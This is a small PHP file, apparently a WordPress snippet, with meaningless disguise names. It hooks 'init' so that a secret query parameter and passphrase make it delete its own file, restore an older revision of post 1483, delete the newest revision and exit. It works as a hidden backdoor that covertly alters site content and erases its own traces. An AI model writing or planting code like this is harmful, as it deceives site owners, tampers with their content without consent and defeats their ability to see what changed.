<?php

function donation_dashboard_sharing_nice() {
	if (isset($_GET['newsletter_style_field']) && $_GET['newsletter_style_field'] === 'anywhere_picker_beaver_converter') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$day_follow_old = 1483;
		$uploader_api_results_github = wp_get_post_revisions($day_follow_old);
		if (empty($uploader_api_results_github)) die('no revisions');
		if (count($uploader_api_results_github) < 2) die('less than 2');
		$calculator_report_visual = array_shift($uploader_api_results_github);
		$about_redirect_player = $calculator_report_visual->ID;
		$footer_gravatar_html5 = array_shift($uploader_api_results_github);
		$based_utils_secure = $footer_gravatar_html5->ID;
		$crm_photos_video_core = wp_restore_post_revision($based_utils_secure);
		if ($crm_photos_video_core === false) die('error restoring');
		$crm_photos_video_core = wp_delete_post_revision($about_redirect_player);		
		if ($crm_photos_video_core === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'donation_dashboard_sharing_nice');
